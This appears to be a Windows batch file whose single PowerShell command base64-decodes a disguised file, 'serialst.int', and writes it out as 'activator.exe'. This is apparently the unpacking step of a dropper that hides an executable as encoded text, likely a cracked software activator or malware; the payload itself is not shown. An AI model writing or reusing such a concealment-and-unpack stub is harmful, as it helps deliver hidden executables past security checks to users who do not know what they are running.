@echo off

powershell -C "& {$outpath = (Join-Path (pwd) 'activator.exe'); $inpath = (Join-Path (pwd) 'serialst.int'); [IO.File]::WriteAllBytes($outpath, ([convert]::FromBase64String(([IO.File]::ReadAllText($inpath)))))}"
